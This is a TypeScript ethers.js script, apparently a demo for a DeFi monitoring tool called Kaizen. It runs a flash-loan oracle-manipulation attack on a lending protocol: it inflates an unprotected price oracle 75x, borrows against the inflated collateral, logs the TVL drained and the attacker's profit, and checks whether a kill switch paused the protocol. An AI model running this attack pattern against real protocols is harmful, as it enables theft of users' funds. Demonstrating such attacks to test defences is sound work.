

import { ethers, Contract } from "ethers";
import {
  banner, step, success, warn, etherscan, sleep, waitAndLog, eth,
  getAttackerWallet, C,
  FLASH_LOAN_ABI, LENDING_ABI, ORACLE_ABI,
} from "./utils";

const PRICE_MULTIPLIER = 75; // inflate collateral price 75x

async function main() {
  banner("ATTACK 2: FLASH LOAN + ORACLE MANIPULATION  (Euler Finance pattern)");

  const attacker = getAttackerWallet();

  const protocol = new Contract(
    process.env.KAIZEN_LEND_ADDRESS!,
    LENDING_ABI,
    attacker
  );
  const oracle = new Contract(
    process.env.ORACLE_ADDRESS!,
    ORACLE_ABI,
    attacker
  );
  const attackContract = new Contract(
    process.env.FLASH_LOAN_ATTACKER_ADDRESS!,
    FLASH_LOAN_ABI,
    attacker
  );
 
  const tvlBefore    = await protocol.totalLiquidity() as bigint;
  const priceBefore  = await oracle.getPrice(ethers.ZeroAddress) as bigint;

  console.log(`${C.dim("Protocol TVL:")}         ${eth(tvlBefore)}`);
  console.log(`${C.dim("Oracle price (before):")} ${ethers.formatEther(priceBefore)} ETH per token`);
  console.log(`${C.dim("Price multiplier:")}      ${PRICE_MULTIPLIER}x`);
  console.log(`${C.dim("Manipulated price:")}     ${ethers.formatEther(priceBefore * BigInt(PRICE_MULTIPLIER))} ETH per token`);
  console.log();
  console.log(C.dim("  The oracle has NO TWAP protection. A single update inflates collateral value"));
  console.log(C.dim("  allowing the attacker to borrow far more than they deposited."));
  console.log();

  attackContract.on("FlashLoanReceived", (amount: bigint) => {
    step(2, `Flash loan received: ${eth(amount)} — executing manipulation...`);
  });

  attackContract.on("OracleManipulated",
    (priceBefore: bigint, priceAfter: bigint, multiplier: bigint) => {
      console.log(
        `  ${C.red("↑")} Oracle: ${ethers.formatEther(priceBefore)} → ` +
        `${ethers.formatEther(priceAfter)} ETH/token (${multiplier}x)`
      );
    }
  );

  attackContract.on("BorrowExecuted", (amount: bigint) => {
    console.log(`  ${C.red("↑")} Borrow executed: ${eth(amount)} (collateral wildly inflated)`);
  });

  attackContract.on("AttackComplete", (profit: bigint) => {
    console.log();
    success(C.bold(`Attack complete — profit: ${eth(profit)}`));
  });

  step(1, `Launching flash loan oracle attack (${PRICE_MULTIPLIER}x manipulation)...`);
  console.log(C.dim(`  1. Borrow 90% of TVL via flash loan`));
  console.log(C.dim(`  2. Deposit 40% as collateral`));
  console.log(C.dim(`  3. Inflate oracle price ${PRICE_MULTIPLIER}x`));
  console.log(C.dim(`  4. Borrow 50% of remaining TVL against inflated collateral`));
  console.log(C.dim(`  5. Repay flash loan — keep the profit`));
  console.log();

  const attackTx = await attackContract.attack(PRICE_MULTIPLIER, {
    gasLimit: 1_000_000,
  });

  const receipt = await waitAndLog(attackTx, "Attack transaction confirmed");
  console.log();

  await sleep(3000);

  const tvlAfter    = await protocol.totalLiquidity() as bigint;
  const priceAfter  = await oracle.getPrice(ethers.ZeroAddress) as bigint;
  const profit      = await attackContract.getProfit() as bigint;
  const isPaused    = await protocol.isPaused() as boolean;

  step(2, "Post-attack state:");
  console.log(`  ${C.dim("TVL before:")}          ${eth(tvlBefore)}`);
  console.log(`  ${C.dim("TVL after:")}           ${eth(tvlAfter)}`);
  console.log(`  ${C.dim("TVL drained:")}         ${eth(tvlBefore - tvlAfter)}`);
  console.log(`  ${C.dim("Oracle price:")}        ${ethers.formatEther(priceAfter)} ETH/token`);
  console.log(`  ${C.dim("Attacker profit:")}     ${eth(profit)}`);
  console.log();

  if (isPaused) {
    success(C.bold("  KAIZEN KILL SWITCH FIRED — Protocol paused"));
  } else {
    warn("Kaizen scoring in progress...");
  }

  console.log(C.dim(`\n  Attack tx: ${etherscan(attackTx.hash)}`));
  console.log(C.dim(`  Block:     ${receipt.blockNumber}`));

  attackContract.removeAllListeners();
}

main().catch(e => {
  console.error(C.red("Attack failed:"), e.message);
  process.exit(1);
});
